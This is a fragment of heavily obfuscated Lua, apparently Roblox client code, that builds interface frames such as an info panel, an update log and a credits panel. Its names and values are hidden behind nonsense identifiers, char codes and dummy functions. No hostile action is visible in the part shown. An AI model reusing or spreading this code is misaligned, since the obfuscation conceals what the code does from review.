uwuuwuUwUUwUOwOUWuOwoOwouwUOwOOwOOwoOwOUwUOwoOwOUwuowOUwuOwoOwO.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(84 ,105 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="DA7B66A80AA290F10008CEAA5F5DEBA2BA11480FA1B502B6E24F078484D4093EECFA2DC4A593A273007FAB73298DE934BCD5"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+16 end)(),(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="D4E28E0A351FD7FB184B3203332448DAD57B20D5230822FA722574D0EE729B189C7B22F86A9960BC771D56E1D603A4CB9820"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+8 end)(),101 ,73 ,110 ,102 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="CFA370F316AD36471C8C2E89B0176A4F5D3FE3A32EB429418DD1C88B99014452A779475379D6F0FD5011F99F31DA0BD2F519"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+11 end)())..""uwuuwuUwUUwUOwOUWuOwoOwouwUOwOOwOOwoOwOUwUOwoOwOUwuowOUwuOwoOwO.Parent=OwOUWUoWOOwOoWOuWuuWUOwOUwUOwOUwuUwUUWUOwOuWuuwUOwouwUoWoUwUUwU uwuuwuUwUUwUOwOUWuOwoOwouwUOwOOwOOwoOwOUwUOwoOwOUwuowOUwuOwoOwO.AnchorPoint=owOUwUuWuOwOOwOOwOUwUowOUwUUwUUwUuWuuwUOwOOwOowOuwUuwuOwOUwUUWu.new(0.5 ,0.5 )uwuuwuUwUUwUOwOUWuOwoOwouwUOwOOwOOwoOwOUwUOwoOwOUwuowOUwuOwoOwO.BackgroundColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(255 ,255 ,255 )uwuuwuUwUUwUOwOUWuOwoOwouwUOwOOwOOwoOwOUwUOwoOwOUwuowOUwuOwoOwO.BackgroundTransparency=1.000  uwuuwuUwUUwUOwOUWuOwoOwouwUOwOOwOOwoOwOUwUOwoOwOUwuowOUwuOwoOwO.Position=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0.49968192 ,0 ,0.5 ,-55 )uwuuwuUwUUwUOwOUWuOwoOwouwUOwOOwOOwoOwOUwUOwoOwOUwuowOUwuOwoOwO.Size=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(1 ,0 ,0 ,30 )uwuuwuUwUUwUOwOUWuOwoOwouwUOwOOwOOwoOwOUwUOwoOwOUwuowOUwuOwoOwO.Font=OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.Font.Gotham uwuuwuUwUUwUOwOUWuOwoOwouwUOwOOwOOwoOwOUwUOwoOwOUwuowOUwuOwoOwO.Text=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(73 ,110 ,102 ,111 )..""uwuuwuUwUUwUOwOUWuOwoOwouwUOwOOwOOwoOwOUwUOwoOwOUwuowOUwuOwoOwO.TextColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB((function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={793,332,964,435,151}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+163,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={64,203,433,302,972}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+163,168 )uwuuwuUwUUwUOwOUWuOwoOwouwUOwOOwOOwoOwOUwUOwoOwOUwuowOUwuOwoOwO.TextSize=20.000  uwuuwuUwUUwUOwOUWuOwoOwouwUOwOOwOOwoOwOUwUOwoOwOUwuowOUwuOwoOwO.TextTransparency=1.000  uwUuwUuwuoWoOwOOwoowoUwUOwOUWUOwOoWoOwOowOOwoOwOowOOwoowOuwUUwU.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(71 ,108 ,111 ,119 ,73 ,110 ,102 ,111 )..""uwUuwUuwuoWoOwOOwoowoUwUOwOUWUOwOoWoOwOowOOwoOwOowOOwoowOuwUUwU.Parent=OwOUWUoWOOwOoWOuWuuWUOwOUwUOwOUwuUwUUWUOwOuWuuwUOwouwUoWoUwUUwU uwUuwUuwuoWoOwOOwoowoUwUOwOUWUOwOoWoOwOowOOwoOwOowOOwoowOuwUUwU.BackgroundColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB((function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={580,516,151,791,169}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+250,255 ,255 )uwUuwUuwuoWoOwOOwoowoUwUOwOUWUOwOoWoOwOowOOwoOwOowOOwoowOuwUUwU.BackgroundTransparency=1.000  uwUuwUuwuoWoOwOOwoowoUwUOwOUWUOwOoWoOwOowOOwoOwOowOOwoowOuwUUwU.BorderSizePixel=0  uwUuwUuwuoWoOwOOwoowoUwUOwOUWUOwOoWoOwOowOOwoOwOowOOwoowOuwUUwU.Position=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0 ,-14 ,0 ,-(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="2F10996B047E"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)())uwUuwUuwuoWoOwOOwoowoUwUOwOUWUOwOoWoOwOowOOwoOwOowOOwoowOuwUUwU.Size=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0.989583194 ,30 ,0.968586385 ,30 )uwUuwUuwuoWoOwOOwoowoUwUOwOUWUOwOoWoOwOowOOwoOwOowOOwoowOuwUUwU.ZIndex=0  uwUuwUuwuoWoOwOOwoowoUwUOwOUWUOwOoWoOwOowOOwoOwOowOOwoowOuwUUwU.Image=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(114 ,98 ,120 ,97 ,115 ,115 ,101 ,116 ,105 ,100 ,58 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="84E066E710949E7939EFCD3A33CB430CD5C5E096BA64E2D"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,UwUUwuOwOowoowOOwOOwOuWuowOOwoUWUuwUOWoUWuOwOowouWUUwuUwUOwOuWu)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={868,407,464,25620 and true or(((uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO))and(29982))*(UwUUwuOwOowoowOOwOOwOuWuowOOwoUWUuwUOWoUWuOwOowouWUUwuUwUOwOuWu)((false)((not(97471)and(96734)))(""+".."..((44453)/(53759)).."")(((12186)+(46408))))^((32437)and(22513)),743}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+42,50 ,57 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="D44567F405FDBC330B6C4B6623C5434488245A63C9304FEC7CE29D9"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),55 ,55 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={62,878,184,719,583}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+47,51 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="7FF2392F62D874246B8125C89036A65D8F61705015B5E6EDB401553"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),49 )..""uwUuwUuwuoWoOwOOwoowoUwUOwOUWUOwOoWoOwOowOOwoOwOowOOwoowOuwUUwU.ImageColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(15 ,15 ,15 )uwUuwUuwuoWoOwOOwoowoUwUOwOUWUOwOoWoOwOowOOwoOwOowOOwoowOuwUUwU.ImageTransparency=1.000  uwUuwUuwuoWoOwOOwoowoUwUOwOUWUOwOoWoOwOowOOwoOwOowOOwoowOuwUUwU.SliceCenter=UwuowOOwOuwUOwouwuuWUUWUOwOuwUOWOOWoUwUuwUUwuOwOOwOUWuOwOUwuOwO.new(20 ,20 ,280 ,280 )UWUoWouwUOWOOwOUwUOwOOwOUwUuwUOwOOwoUwuuwUOwOUwUowoUwUUwuOWOowO.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(67 ,111 ,110 ,116 ,97 ,105 ,110 ,101 ,114 ,73 ,110 ,102 ,111 )..""UWUoWouwUOWOOwOUwUOwOOwOUwUuwUOwOOwoUwuuwUOwOUwUowoUwUUwuOWOowO.Parent=OwOUWUoWOOwOoWOuWuuWUOwOUwUOwOUwuUwUUWUOwOuWuuwUOwouwUoWoUwUUwU UWUoWouwUOWOOwOUwUOwOOwOUwUuwUOwOOwoUwuuwUOwOUwUowoUwUUwuOWOowO.BackgroundColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(33 ,33 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={585,718,515,554,373}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+28)UWUoWouwUOWOOwOUwUOwOOwOUwUuwUOwOOwoUwuuwUOwOUwUowoUwUUwuOWOowO.BackgroundTransparency=1.000  UWUoWouwUOWOOwOUwUOwOOwOUwUuwUOwOOwoUwuuwUOwOUwUowoUwUUwuOWOowO.Position=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0.0327774696 ,0 ,0.367913216 ,0 )UWUoWouwUOWOOwOUwUOwOOwOUwUuwUOwOOwoUwuuwUOwOUwUowoUwUUwuOWOowO.Size=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0 ,179 ,0 ,107 )OWOUwUOwOOwoOwoOWOOwOOwOOwooWoUwuuwUOwouwUowOUwUOwoowOowOOwOuwU.CornerRadius=oWoowOoWOUWUUWUUwUUwUoWoOwOOwOOwoOwOOwOOwOUwUuwUowOOwOUWuOWoowO.new(0 ,11 )OWOUwUOwOOwoOwoOWOOwOOwOOwooWoUwuuwUOwouwUowOUwUOwoowOowOOwOuwU.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(67 ,111 ,110 ,116 ,97 ,105 ,110 ,101 ,114 ,73 ,110 ,102 ,111 ,85 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="9902CFD2265A83889F1413C8D92AC23E58AC0C256C32F2C84934F7B564E206D5B4EE06A1A"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="CF4359A5110F2BBE7B8368B6C3A0F46328676FBCB745E018A77C81D7AC46022C194"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),111 ,114 ,110 ,101 ,114 )..""OWOUwUOwOOwoOwoOWOOwOOwOOwooWoUwuuwUOwouwUowOUwUOwoowOowOOwOuwU.Parent=UWUoWouwUOWOOwOUwUOwOOwOUwUuwUOwOOwoUwuuwUOwOUwUowoUwUUwuOWOowO UwuOwOOwoOwOuwUUwUOwOOwoUwUOwOuWUuwuowOOwOuwUOwOuwUoWOOwoUwUUWU.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char((function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="5633B6A1265DD78270444DF88547E8E53E534A056C1CD5ED7F88725CE3C680A0C522C3CFB4F2A8F493C12"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),112 ,100 ,97 ,116 ,101 ,76 ,111 ,103 ,84 ,101 ,120 ,116 )..""UwuOwOOwoOwOuwUUwUOwOOwoUwUOwOuWUuwuowOOwOuwUOwOuwUoWOOwoUwUUWU.Parent=UWUoWouwUOWOOwOUwUOwOOwOUwUuwUOwOOwoUwuuwUOwOUwUowoUwUUwuOWOowO UwuOwOOwoOwOuwUUwUOwOOwoUwUOwOuWUuwuowOOwOuwUOwOuwUoWOOwoUwUUWU.AnchorPoint=owOUwUuWuOwOOwOOwOUwUowOUwUUwUUwUuWuuwUOwOOwOowOuwUuwuOwOUwUUWu.new(0.5 ,0.5 )UwuOwOOwoOwOuwUUwUOwOOwoUwUOwOuWUuwuowOOwOuwUOwOuwUoWOOwoUwUUWU.BackgroundColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(255 ,255 ,255 )UwuOwOOwoOwOuwUUwUOwOOwoUwUOwOuWUuwuowOOwOuwUOwOuwUoWOOwoUwUUWU.BackgroundTransparency=1.000  UwuOwOOwoOwOuwUUwUOwOOwoUwUOwOuWUuwuowOOwOuwUOwOuwUoWOOwoUwUUWU.Position=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0.49825418 ,0 ,0.633732855 ,-15 )UwuOwOOwoOwOuwUUwUOwOOwoUwUOwOuWUuwuowOOwOuwUOwOuwUoWOOwoUwUUWU.Size=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0 ,165 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+0,88 )UwuOwOOwoOwOuwUUwUOwOOwoUwUOwOuWUuwuowOOwOuwUOwOuwUoWOOwoUwUUWU.Font=OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.Font.Gotham UwuOwOOwoOwOuwUUwUOwOOwoUwUOwOuWUuwuowOOwOuwUOwOuwUoWOOwoUwUUWU.Text=OWOUwuowOUwuoWOUwuuwUOwOuWuuWUowOOwouwUOwOowOOwOuwuowOOwOuwUUWu UwuOwOOwoOwOuwUUwUOwOOwoUwUOwOuWUuwuowOOwOuwUOwOuwUoWOOwoUwUUWU.TextColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(168 ,168 ,168 )UwuOwOOwoOwOuwUUwUOwOOwoUwUOwOuWUuwuowOOwOuwUOwOuwUoWOOwoUwUUWU.TextSize=15.000  UwuOwOOwoOwOuwUUwUOwOOwoUwUOwOuWUuwuowOOwOuwUOwOuwUoWOOwoUwUUWU.TextTransparency=1.000  UwuOwOOwoOwOuwUUwUOwOOwoUwUOwOuWUuwuowOOwOuwUOwOuwUoWOOwoUwUUWU.TextWrapped=true  UwuOWOOwouwuOwOowOOwOuwuOWouWuuWUOwoowOowOUWuOwOOwOOwoowoUwuUwU.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(67 ,114 ,101 ,100 ,105 ,116 ,115 ,70 ,114 ,97 ,109 ,101 )..""UwuOWOOwouwuOwOowOOwOuwuOWouWuuWUOwoowOowOUWuOwOOwOOwoowoUwuUwU.Parent=OwOuWuUwUOwOOwOowOUwUuwUOwOOwOUwUowOUwUOwOUwUOwOUwuowOUwUuWuOWo UwuOWOOwouwuOwOowOOwOuwuOWouWuuWUOwoowOowOUWuOwOOwOOwoowoUwuUwU.AnchorPoint=owOUwUuWuOwOOwOOwOUwUowOUwUUwUUwUuWuuwUOwOOwOowOuwUuwuOwOUwUUWu.new(0.5 ,0.5 )UwuOWOOwouwuOwOowOOwOuwuOWouWuuWUOwoowOowOUWuOwOOwOOwoowoUwuUwU.BackgroundColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(79 ,79 ,79 )UwuOWOOwouwuOwOowOOwOuwuOWouWuuWUOwoowOowOUWuOwOOwOOwoowoUwuUwU.BackgroundTransparency=1.000  UwuOWOOwouwuOwOowOOwOuwuOWouWuuWUOwoowOowOUWuOwOOwOOwoowoUwuUwU.Position=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0.667447925 ,0 ,0.5 ,0 )UwuOWOOwouwuOwOowOOwOuwuOWouWuuWUOwoowOowOUWuOwOOwOOwoowoUwuUwU.Size=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new((function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO=""return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),192 ,0 ,191 )OwOOwOuWUOwoUwUuWUOwoUwuOwOowOOwOUwuuwUuwUUwuowoOwOuwUUWUowOUwU.CornerRadius=oWoowOoWOUWUUWUUwUUwUoWoOwOOwOOwoOwOOwOOwOUwUuwUowOOwOUWuOWoowO.new(0 ,11 )OwOOwOuWUOwoUwUuWUOwoUwuOwOowOOwOUwuuwUuwUUwuowoOwOuwUUWUowOUwU.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(67 ,114 ,101 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="89B5C3A761C0FA0076CCF05E5184FC6AF1A66F5AE0C9C855AB48945444A88DABD5BDEF3E2CE31BB5531262BEBA09ED4B55B0"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+0 end)(),(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="CE083E5759730583178E84EF61520D5FF49835407962B7B40722C747282FEE65B21A0BE59DD26A68BCF5BF32403C12B84689"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+5 end)(),116 ,115 ,70 ,114 ,97 ,109 ,101 ,85 ,73 ,67 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={771,503,238,828,835}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+106,114 ,110 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="7F14063712087C94B0A33595D2E9E30DA63653216C6C79494FDBED748D4875EC18454339E5654EAF4D1D0094911FC11FAA4C"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+1 end)(),114 )..""OwOOwOuWUOwoUwUuWUOwoUwuOwOowOOwOUwuuwUuwUUwuowoOwOuwUUWUowOUwU.Parent=UwuOWOOwouwuOwOowOOwOuwuOWouWuuWUOwoowOowOUWuOwOOwOOwoowoUwuUwU OwOUwUOwOUwUUwUowOUwUOwOowOUWuowOowOOwouwuOwOuwUOWOoWoOwoOwOUwu.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(84 ,(function()local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO="955EA13D2751B115453EC313E4E0EC32FC79CD84D1456559538F5413A477A99757E3D7FE91FC128FAB33465B0C0EF74B1D2E"return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO+5 end)(),116 ,108 ,101 ,67 ,114 ,101 ,100 ,105 ,116 ,115 )..""OwOUwUOwOUwUUwUowOUwUOwOowOUWuowOowOOwouwuOwOuwUOWOoWoOwoOwOUwu.Parent=UwuOWOOwouwuOwOowOOwOuwuOWouWuuWUOwoowOowOUWuOwOOwOOwoowoUwuUwU OwOUwUOwOUwUUwUowOUwUOwOowOUWuowOowOOwouwuOwOuwUOWOoWoOwoOwOUwu.AnchorPoint=owOUwUuWuOwOOwOOwOUwUowOUwUUwUUwUuWuuwUOwOOwOowOuwUuwuOwOUwUUWu.new(0.5 ,0.5 )OwOUwUOwOUwUUwUowOUwUOwOowOUWuowOowOOwouwuOwOuwUOWOoWoOwoOwOUwu.BackgroundColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(255 ,255 ,255 )OwOUwUOwOUwUUwUowOUwUOwOowOUWuowOowOOwouwuOwOuwUOWOoWoOwoOwOUwu.BackgroundTransparency=1.000  OwOUwUOwOUwUUwUowOUwUOwOowOUWuowOowOOwouwuOwOuwUOWOoWoOwoOwOUwu.Position=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0.49968192 ,0 ,0.5 ,-55 )OwOUwUOwOUwUUwUowOUwUOwOowOUWuowOowOOwouwuOwOuwUOWOoWoOwoOwOUwu.Size=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(1 ,(function(uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO,uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO)local uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO={}return#uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO end)()+0,0 ,30 )OwOUwUOwOUwUUwUowOUwUOwOowOUWuowOowOOwouwuOwOuwUOWOoWoOwoOwOUwu.Font=OwoowOowOuWuUwuOwOuwUuwUOwouWuuwUOwooWoUWuOwOUwUuwUOwOOwOUwUOwO.Font.Gotham OwOUwUOwOUwUUwUowOUwUOwOowOUWuowOowOOwouwuOwOuwUOWOoWoOwoOwOUwu.Text=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(67 ,114 ,101 ,100 ,105 ,116 ,115 )..""OwOUwUOwOUwUUwUowOUwUOwOowOUWuowOowOOwouwuOwOuwUOWOoWoOwoOwOUwu.TextColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(168 ,168 ,168 )OwOUwUOwOUwUUwUowOUwUOwOowOUWuowOowOOwouwuOwOuwUOWOoWoOwoOwOUwu.TextSize=20.000  OwOUwUOwOUwUUwUowOUwUOwOowOUWuowOowOOwouwuOwOuwUOWOoWoOwoOwOUwu.TextTransparency=1.000  uwUowOowOOwOUwUuwUOwOuwUUwUOwOOwOOwOowOOWOOwOUWUUwUUWuOwOOwOuwU.Name=uwUUwUowOUWUuWUUwUUwUUwUOwouWUOwoOwoOWOuwUOwOUwUUwUuwUuwUUwUowO.char(71 ,108 ,111 ,119 ,67 ,114 ,101 ,100 ,105 ,116 ,115 )..""uwUowOowOOwOUwUuwUOwOuwUUwUOwOOwOOwOowOOWOOwOUWUUwUUWuOwOOwOuwU.Parent=UwuOWOOwouwuOwOowOOwOuwuOWouWuuWUOwoowOowOUWuOwOOwOOwoowoUwuUwU uwUowOowOOwOUwUuwUOwOuwUUwUOwOOwOOwOowOOWOOwOUWUUwUUWuOwOOwOuwU.BackgroundColor3=UwuUwuUwUowOuwUUwuOWoUwuUWUoWoOwOowOowOowOuWuowOOWoOwoUwuUwUUwU.fromRGB(255 ,255 ,255 )uwUowOowOOwOUwUuwUOwOuwUUwUOwOOwOOwOowOOWOOwOUWUUwUUWuOwOOwOuwU.BackgroundTransparency=1.000  uwUowOowOOwOUwUuwUOwOuwUUwUOwOOwOOwOowOOWOOwOUWUUwUUWuOwOOwOuwU.BorderSizePixel=0  uwUowOowOOwOUwUuwUOwOuwUUwUOwOOwOOwOowOOWOOwOUWUUwUUWuOwOOwOuwU.Position=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0 ,-14 ,0 ,-12 )uwUowOowOOwOUwUuwUOwOuwUUwUOwOOwOOwOowOOWOOwOUWUUwUUWuOwOOwOuwU.Size=OwOOwOOwoUWuOwOuwUOwOUwuowoOwOUwUOwOowOUWuuwUUwUowOuwUUwUowOUWU.new(0.989583194 ,30 ,0.968586385 ,30 )uwUowOowOOwOUwUuwUOwOuwUUwUOwOOwOOwOowOOWOOwOUWUUwUUWuOwOOwOuwU.ZIndex=0  